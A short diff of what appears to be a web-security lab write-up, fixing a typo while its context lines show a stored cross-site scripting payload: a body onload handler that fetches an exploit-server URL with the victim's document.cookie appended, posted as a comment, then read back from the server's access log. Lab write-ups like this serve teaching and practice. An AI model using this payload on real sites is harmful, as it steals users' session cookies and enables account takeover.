@@ -150,7 +150,7 @@ We can take the exploit server url &amp; append place that in our payload so it 
 <body onload="fetch('[explloitServerUrl'+document.cookie)">
 ```
 
-We then submit this as a commment.
+We then submit this as a comment.
 ![](/ox-hugo/2025-11-10_05-36.png)
 
 Now when go back to the exploit server page we can check the "Access log" to see what has accessed the exploit server url.
